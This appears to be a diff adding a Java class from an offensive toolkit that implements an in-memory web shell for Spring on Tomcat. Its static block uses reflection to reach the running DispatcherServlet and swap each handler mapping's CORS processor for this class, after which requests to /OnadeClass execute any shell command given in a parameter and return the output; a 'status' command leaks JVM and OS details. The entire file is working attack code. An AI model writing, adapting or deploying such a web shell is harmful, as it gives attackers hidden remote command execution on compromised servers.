@@ -1,0 +1,240 @@
+package com.m1yuu.m1yuu_tools.evilClass;
+
+import org.apache.catalina.connector.Response;
+import org.apache.catalina.connector.ResponseFacade;
+import org.apache.catalina.core.ApplicationFilterChain;
+import org.springframework.lang.Nullable;
+import org.springframework.web.cors.CorsConfiguration;
+import org.springframework.web.cors.DefaultCorsProcessor;
+
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.io.InputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.Modifier;
+import java.util.Scanner;
+
+public class OnadeClass extends DefaultCorsProcessor {
+
+    @Override
+    public boolean processRequest(@Nullable CorsConfiguration config, HttpServletRequest request, HttpServletResponse response) throws IOException {
+        try {
+            if (request.getRequestURI().equals("/OnadeClass")) {
+                String cmd = request.getParameter("OnadeClass");
+                if (cmd != null) {
+                    // 检查是否为status命令
+                    if ("status".equals(cmd)) {
+                        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+                        String currentTime = sdf.format(new java.util.Date());
+                        Runtime runtime = Runtime.getRuntime();
+                        long totalMemory = runtime.totalMemory();
+                        long freeMemory = runtime.freeMemory();
+                        long usedMemory = totalMemory - freeMemory;
+                        long maxMemory = runtime.maxMemory();
+                        String status = "=== Memory Shell Status ===\n" +
+                                "Type: corsprocessor\n" +
+                                "Current Time: " + currentTime + "\n" +
+                                "Java Version: " + System.getProperty("java.version") + "\n" +
+                                "JVM Name: " + System.getProperty("java.vm.name") + "\n" +
+                                "JVM Version: " + System.getProperty("java.vm.version") + "\n" +
+                                "OS Name: " + System.getProperty("os.name") + "\n" +
+                                "OS Version: " + System.getProperty("os.version") + "\n" +
+                                "Total Memory: " + (totalMemory / 1024 / 1024) + " MB\n" +
+                                "Used Memory: " + (usedMemory / 1024 / 1024) + " MB\n" +
+                                "Free Memory: " + (freeMemory / 1024 / 1024) + " MB\n" +
+                                "Max Memory: " + (maxMemory / 1024 / 1024) + " MB\n" +
+                                "========================";
+                        response.getWriter().write(status);
+                        response.getWriter().flush();
+                        response.getWriter().close();
+                        return false;
+                    }
+                    
+                    boolean isLinux = true;
+                    String osTyp = System.getProperty("os.name");
+                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
+                        isLinux = false;
+                    }
+                    String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
+                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+                    Scanner s = new Scanner(in).useDelimiter("\\A");
+                    String output = s.hasNext() ? s.next() : "";
+                    response.getWriter().write(output);
+                    response.getWriter().flush();
+                    response.getWriter().close();
+                }
+            }
+
+        } catch (Exception var7) {
+            var7.printStackTrace();
+        }
+        return true;
+
+    }
+
+    static {
+        boolean hasReplacement = false;
+
+        try {
+            System.out.println("=== 替换DefaultCorsProcessor ===");
+
+            Thread currentThread = Thread.currentThread();
+
+            // 1. 获取 threadLocals
+            java.lang.reflect.Field threadLocalsField = Thread.class.getDeclaredField("threadLocals");
+            threadLocalsField.setAccessible(true);
+            Object threadLocalMap = threadLocalsField.get(currentThread);
+
+            if (threadLocalMap == null) {
+                System.out.println("threadLocalMap为空");
+            }
+
+            // 2. 获取 table 数组
+            java.lang.reflect.Field tableField = threadLocalMap.getClass().getDeclaredField("table");
+            tableField.setAccessible(true);
+            Object[] table = (Object[]) tableField.get(threadLocalMap);
+
+            // 3. 遍历 table 查找 DispatcherServlet Lambda
+            for (Object entry : table) {
+                if (entry != null) {
+                    java.lang.reflect.Field valueField = entry.getClass().getDeclaredField("value");
+                    valueField.setAccessible(true);
+                    Object lambdaValue = valueField.get(entry);
+
+                    if (lambdaValue != null && lambdaValue.getClass().getName().contains("DispatcherServlet$$Lambda")) {
+                        System.out.println("找到DispatcherServlet Lambda: " + lambdaValue.getClass().getName());
+
+                        // 4. 获取 Lambda 的所有字段
+                        java.lang.reflect.Field[] lambdaFields = lambdaValue.getClass().getDeclaredFields();
+                        for (java.lang.reflect.Field lambdaField : lambdaFields) {
+                            lambdaField.setAccessible(true);
+                            Object fieldValue = lambdaField.get(lambdaValue);
+
+                            // 5. 找到 RequestFacade
+                            if (fieldValue instanceof org.apache.catalina.connector.RequestFacade) {
+                                System.out.println("找到RequestFacade");
+
+                                // 6. 获取内部 Request
+                                java.lang.reflect.Field requestField =
+                                        fieldValue.getClass().getDeclaredField("request");
+                                requestField.setAccessible(true);
+                                org.apache.catalina.connector.Request request =
+                                        (org.apache.catalina.connector.Request) requestField.get(fieldValue);
+
+                                System.out.println("找到Request");
+
+                                // 7. 获取 filterChain
+                                java.lang.reflect.Field filterChainField =
+                                        org.apache.catalina.connector.Request.class.getDeclaredField("filterChain");
+                                filterChainField.setAccessible(true);
+                                org.apache.catalina.core.ApplicationFilterChain filterChain =
+                                        (org.apache.catalina.core.ApplicationFilterChain) filterChainField.get(request);
+
+                                if (filterChain == null) {
+                                    System.out.println("filterChain为空");
+                                    continue;
+                                }
+
+                                System.out.println("找到FilterChain");
+
+                                // 8. 获取 servlet (DispatcherServlet)
+                                java.lang.reflect.Field servletField =
+                                        filterChain.getClass().getDeclaredField("servlet");
+                                servletField.setAccessible(true);
+                                org.springframework.web.servlet.DispatcherServlet dispatcherServlet =
+                                        (org.springframework.web.servlet.DispatcherServlet) servletField.get(filterChain);
+
+                                if (dispatcherServlet == null) {
+                                    System.out.println("DispatcherServlet为空");
+                                    continue;
+                                }
+
+                                System.out.println("找到DispatcherServlet");
+
+                                // 9. 获取 handlerMappings 列表
+                                java.lang.reflect.Field handlerMappingsField =
+                                        org.springframework.web.servlet.DispatcherServlet.class.getDeclaredField("handlerMappings");
+                                handlerMappingsField.setAccessible(true);
+                                java.util.List<org.springframework.web.servlet.HandlerMapping> handlerMappings =
+                                        (java.util.List<org.springframework.web.servlet.HandlerMapping>) handlerMappingsField.get(dispatcherServlet);
+
+                                if (handlerMappings == null || handlerMappings.isEmpty()) {
+                                    System.out.println("handlerMappings列表为空");
+                                }
+
+                                System.out.println("找到handlerMappings列表，数量: " + handlerMappings.size());
+
+                                // 10. 遍历 handlerMappings，查找并替换 corsProcessor
+                                for (int i = 0; i < handlerMappings.size(); i++) {
+                                    org.springframework.web.servlet.HandlerMapping mapping = handlerMappings.get(i);
+
+                                    System.out.println("  [" + i + "] " + mapping.getClass().getSimpleName());
+
+                                    // 查找 corsProcessor 字段（可能在父类中）
+                                    java.lang.reflect.Field corsProcessorField = null;
+                                    Class<?> currentClass = mapping.getClass();
+
+                                    while (currentClass != null && corsProcessorField == null) {
+                                        try {
+                                            corsProcessorField = currentClass.getDeclaredField("corsProcessor");
+                                            break;
+                                        } catch (NoSuchFieldException e) {
+                                            currentClass = currentClass.getSuperclass();
+                                        }
+                                    }
+
+                                    if (corsProcessorField != null) {
+                                        corsProcessorField.setAccessible(true);
+                                        Object currentProcessor = corsProcessorField.get(mapping);
+
+                                        if (currentProcessor != null) {
+                                            System.out.println("    找到corsProcessor: " + currentProcessor.getClass().getSimpleName());
+
+                                            // 检查是否已被替换
+                                            if (currentProcessor instanceof OnadeClass) {
+                                                System.out.println("    已经是ExifilDefaultCorsProcessor，跳过");
+                                                continue;
+                                            }
+
+                                            // 创建恶意 CorsProcessor
+                                            OnadeClass maliciousProcessor =
+                                                    new OnadeClass();
+
+                                            // 替换
+                                            corsProcessorField.set(mapping, maliciousProcessor);
+                                            System.out.println("    ✓ 成功替换 " + mapping.getClass().getSimpleName() + " 的 corsProcessor");
+
+                                            hasReplacement = true;
+                                        } else {
+                                            System.out.println("    corsProcessor为null");
+                                        }
+                                    } else {
+                                        System.out.println("    未找到corsProcessor字段");
+                                    }
+                                }
+
+                                if (hasReplacement) {
+                                    System.out.println("=== CorsProcessor替换完成！===");
+                                } else {
+                                    System.out.println("未找到需要替换的CorsProcessor");
+                                }
+
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (!hasReplacement) {
+                System.out.println("未找到DispatcherServlet Lambda");
+            }
+
+        } catch (Exception e) {
+            System.out.println("替换异常: " + e.getMessage());
+            e.printStackTrace();
+        }
+    }
+}
